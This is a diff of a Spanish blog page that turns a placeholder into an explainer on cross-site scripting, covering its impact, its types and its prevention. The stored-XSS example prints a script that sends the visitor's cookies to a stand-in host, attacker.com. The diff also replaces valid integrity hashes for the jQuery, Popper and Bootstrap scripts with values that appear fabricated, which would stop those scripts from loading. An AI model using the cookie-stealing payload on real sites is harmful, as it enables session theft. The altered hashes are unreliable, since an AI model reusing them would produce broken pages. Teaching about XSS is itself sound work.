@@ -1,10 +1,11 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="es">
 <head>
     <!-- Required meta tags -->
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-    <title>XSS</title>
+    
+    <title>¿Qué es XSS? | Cómo funciona y cómo mitigarlo</title>
 
     <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.3/css/all.css" integrity="sha384-UHRtZLI+pbxtHCWp1t77Bi1L4ZtiqrqD80Kn4Z8NTSRyMA2Fd33n5dQ8lWUE00s/" crossorigin="anonymous">
     <link rel="stylesheet" href="../css/bootstrap4-neon-glow.min.css"> <!-- Ajustar la ruta -->
@@ -23,19 +24,29 @@
             }
         }
 
-        /* Adjust font size for the "XSS" title on mobile screens */
+        /* Adjust font size for the title on mobile screens */
         @media (max-width: 767.98px) {
             .jumbotron h1.display-2 {
                 font-size: 2.5rem; /* Adjusted size for mobile */
             }
         }
 
-        /* Full height card */
+        /* Adjust heading and text sizes */
+        h1.display-2 {
+            font-size: 4rem; /* Increased size for main title */
+        }
+        h4.card-title {
+            font-size: 2rem; /* Larger size for card titles */
+        }
+        .text-grey {
+            font-size: 0.9rem; /* Smaller text for body content */
+        }
+        
+        /* Full width card */
         .card {
-            height: calc(100vh - 160px); /* Full height minus jumbotron and navbar */
             width: 100%;                 /* Full width of the parent column */
-            max-width: 900px;            /* Limita el ancho máximo en pantallas grandes */
-            margin-top: 0;               /* No margin on top */
+            max-width: 900px;            /* Limit max width on larger screens */
+            margin: 20px auto;           /* Center the card and add margin */
             border-radius: 0;            /* Remove border radius to fit better */
         }
 
@@ -47,8 +58,13 @@
 
         /* Ensure body takes full height */
         body {
-            height: 100vh;
+            height: auto; /* Let the body take the height based on content */
             margin: 0; /* Remove default margin */
+        }
+
+        /* Align text to the left */
+        .card-body {
+            text-align: left; /* Aligns text to the left */
         }
     </style>
 </head>
@@ -81,10 +97,11 @@
 <div class="jumbotron bg-transparent mb-0">
     <div class="container">
         <h1 class="display-2">XSS<span class="vim-caret">/</span></h1> <!-- Título actualizado -->
-        <div class="lead mb-3 text-mono text-success">SQL Injection </div> <!-- Texto adicional -->
+        <div class="lead mb-3 text-mono text-success">Cross-Site Scripting</div> <!-- Texto adicional -->
     </div>
 </div>
 
+<!-- Main content area -->
 <div class="container">
     <div class="row justify-content-center">
         <div class="col-md-10"> <!-- Ajustado a col-md-10 para mayor anchura en pantalla -->
@@ -103,19 +120,70 @@
                     </ul>
                 </div>
                 <div class="card-body">
-                    <h4 class="card-title">Special title treatment</h4>
-                    <p class="card-text">With supporting text below as a natural lead-in to additional content.</p>
-                    <a href="../blog.html" class="btn btn-primary">Volver</a> <!-- Cambiado a "Volver" -->
+                    <h4 class="mt-4 text-grey" style="font-weight: bold;">¿Qué es XSS?</h4>
+                    <p class="card-title text-grey text-spacey">
+                        Cross-Site Scripting (XSS) es una vulnerabilidad de seguridad en aplicaciones web que permite a los atacantes inyectar scripts maliciosos en las páginas vistas por otros usuarios. Esta técnica se utiliza para robar información sensible, como cookies de sesión, credenciales o incluso para redirigir a los usuarios a sitios maliciosos.
+                    </p>
+
+                    <h4 class="mt-4 text-grey" style="font-weight: bold;">Historia y Descubrimiento</h4>
+                    <p class="card-title text-grey text-spacey">
+                        XSS ha sido un problema conocido desde los primeros días de la web. Se hizo evidente a medida que las aplicaciones web comenzaron a permitir la interacción del usuario, especialmente en foros y aplicaciones de redes sociales. La vulnerabilidad fue documentada por primera vez a principios de la década de 2000 y ha sido incluida en el <strong>Top Ten de OWASP</strong> desde entonces.
+                    </p>
+
+                    <h4 class="mt-4 text-grey" style="font-weight: bold;">Impacto de XSS</h4>
+                    <p class="card-title text-grey text-spacey">
+                        Las vulnerabilidades XSS pueden tener graves consecuencias, incluyendo:
+                    </p>
+                    <p class="card-title text-grey text-spacey">1. Robo de información: Los atacantes pueden robar cookies, tokens de sesión y credenciales de usuario.</p>
+                    <p class="card-title text-grey text-spacey">2. Defacement: Modificación no autorizada del contenido de una página web.</p>
+                    <p class="card-title text-grey text-spacey">3. Redirección: Los usuarios pueden ser redirigidos a sitios web maliciosos.</p>
+
+                    <h4 class="mt-4 text-grey" style="font-weight: bold;">Ejemplos de XSS</h4>
+                    <h4 class="mt-4 text-grey" style="font-weight: bold;">1. Ejemplo de XSS Reflejado:</h4>
+                    <p class="card-title text-grey text-spacey">Imagina un sitio web que muestra un mensaje de saludo en función de un parámetro en la URL:</p>
+                    <div class="card border-primary mb-3 text-center">
+                        <div class="card-body">
+                            <p class="mt-4 text-grey" style="font-weight: bold;">https://example.com/welcome?name=<code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></p>
+                            <p class="card-title text-grey text-spacey">El atacante puede inyectar un script que se ejecuta en el navegador del usuario, mostrando un mensaje de alerta.</p>
+                        </div>
+                    </div>
+
+                    <h4 class="mt-4 text-grey" style="font-weight: bold;">2. Ejemplo de XSS Almacenado:</h4>
+                    <p class="card-title text-grey text-spacey">Un atacante publica un comentario en un blog que contiene un script malicioso:</p>
+                    <div class="card border-primary mb-3 text-center">
+                        <div class="card-body">
+                            <p class="mt-4 text-grey" style="font-weight: bold;">&lt;script&gt;fetch('https://attacker.com/steal?cookie=' + document.cookie)&lt;/script&gt;</p>
+                            <p class="card-title text-grey text-spacey">Cuando otros usuarios ven el comentario, su cookie se envía al atacante.</p>
+                        </div>
+                    </div>
+
+                    <h4 class="mt-4 text-grey" style="font-weight: bold;">Tipos de XSS</h4>
+                    <p class="card-title text-grey text-spacey">Los tipos principales de XSS son:</p>
+                    <ul class="card-title text-grey text-spacey">
+                        <li><strong>XSS Reflejado:</strong> El script malicioso es parte de la solicitud y se refleja en la respuesta del servidor.</li>
+                        <li><strong>XSS Almacenado:</strong> El script malicioso se almacena en el servidor (por ejemplo, en una base de datos) y se sirve a otros usuarios.</li>
+                        <li><strong>XSS DOM-Based:</strong> El ataque se realiza mediante manipulación del Document Object Model (DOM) del navegador.</li>
+                    </ul>
+
+                    <h4 class="mt-4 text-grey" style="font-weight: bold;">Prevención de XSS</h4>
+                    <p class="card-title text-grey text-spacey">Las estrategias de prevención incluyen:</p>
+                    <ul class="card-title text-grey text-spacey">
+                        <li><strong>Validación de entrada:</strong> Asegurarse de que los datos de entrada sean válidos y no contengan scripts maliciosos.</li>
+                        <li><strong>Codificación de salida:</strong> Escapar caracteres especiales en el HTML (por ejemplo, <code>&lt;</code> a <code>&amp;lt;</code>).</li>
+                        <li><strong>Uso de CSP:</strong> Content Security Policy (CSP) puede ayudar a mitigar el impacto de XSS al restringir los orígenes de contenido.</li>
+                    </ul>
+                 <div class="btn-container"> <!-- Contenedor para centrar el botón -->
+                        <a href="../blog.html" class="btn btn-primary mt-4">Volver</a> <!-- Ajustar la ruta -->
+                    </div>
                 </div>
             </div>
         </div>
     </div>
 </div>
 
-<!-- Optional JavaScript -->
-<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4f86dIHNDz0W1" crossorigin="anonymous"></script>
-<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
-
+<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT+6u6T1z2s8+4s1s2O71A7sS4e1Tf7w+j6hMZx1p2FxZf7k45" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-JZ0knsC10P/94a60KdVnWxH6/6dQIRJ10/Ou1I3zPc07+3SyFYhS8Gs/4YlP4D7b" crossorigin="anonymous"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-ggOyR0iXCbMQv3Xip8nQ7g2PtT5g8sZ4Cj30gB5F9sc5P2Bk8QFwmMx9R5+56qKt" crossorigin="anonymous"></script>
 </body>
 </html>
+
